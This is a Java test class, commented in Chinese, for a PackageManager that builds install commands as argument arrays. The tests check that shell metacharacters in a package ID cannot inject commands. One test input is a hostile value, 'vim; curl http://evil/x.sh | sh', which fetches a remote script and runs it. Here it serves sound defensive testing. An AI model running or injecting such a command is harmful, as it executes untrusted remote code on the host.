package com.chua.common.support.lang.cmd;

import java.util.Arrays;
import java.util.Map;

/**
 * 包管理器安装命令的参数化构造测试。
 *
 * <p>{@code PackageManager} 过去用 {@code String.format(installTemplate, packageId)} 生成
 * 一整串命令再交给 {@code CmdExecutors.execute(String, …)}，而字符串形式会走
 * {@code cmd.exe /c}，{@code packageId} 里的 shell 元字符会被执行。
 * 现在改为把模板拆成进程参数数组、{@code %s} 位整体替换为 {@code packageId}。</p>
 *
 * @author CH
 * @since 4.0.0.45
 */
public class PackageManagerArgvTest {

    private static int pass = 0;
    private static int fail = 0;

    /**
     * 主方法。
     *
     * @param args args
     */
    public static void main(String[] args) {
        check("winget 模板拆分为 6 个参数", Arrays.equals(
                PackageManager.installArgs(PackageManager.Type.WINGET, "Microsoft.VisualStudioCode"),
                new String[]{"winget", "install", "--id", "Microsoft.VisualStudioCode",
                        "--silent", "--accept-package-agreements"}));

        check("choco 模板拆分为 4 个参数", Arrays.equals(
                PackageManager.installArgs(PackageManager.Type.CHOCO, "pandoc"),
                new String[]{"choco", "install", "-y", "pandoc"}));

        String[] apk = PackageManager.installArgs(PackageManager.Type.APK, "bash");
        check("apk 模板拆分为 3 个参数", Arrays.equals(apk, new String[]{"apk", "add", "bash"}));

        String[] apt = PackageManager.installArgs(PackageManager.Type.APT, "vim");
        System.out.println("      apt argv=" + Arrays.toString(apt) + " env=" + PackageManager.installEnv(PackageManager.Type.APT));
        check("apt 的 DEBIAN_FRONTEND 前缀不留在参数里", Arrays.equals(apt, new String[]{"apt", "install", "-y", "vim"}));
        Map<String, String> aptEnv = PackageManager.installEnv(PackageManager.Type.APT);
        check("apt 的不交互改为环境变量下传", aptEnv != null && "noninteractive".equals(aptEnv.get("DEBIAN_FRONTEND")));
        check("其余包管理器无环境变量前缀", PackageManager.installEnv(PackageManager.Type.BREW) == null);

        String[] evil = PackageManager.installArgs(PackageManager.Type.YUM,
                "vim; curl http://evil/x.sh | sh && calc");
        System.out.println("      yum argv=" + Arrays.toString(evil));
        check("注入串整体作为单个参数传递", evil.length == 4 && evil[3].startsWith("vim; curl"));
        String[] spaced = PackageManager.installArgs(PackageManager.Type.CHOCO, "a b");
        check("含空格的包 ID 不会被拆开", spaced.length == 4 && "a b".equals(spaced[3]));

        System.out.println("[PackageManagerArgvTest] pass=" + pass + " fail=" + fail);
        if (fail > 0) {
            System.exit(1);
        }
    }

    private static void check(String name, boolean ok) {
        if (ok) {
            pass++;
            System.out.println("  PASS " + name);
        } else {
            fail++;
            System.out.println("  FAIL " + name);
        }
    }
}
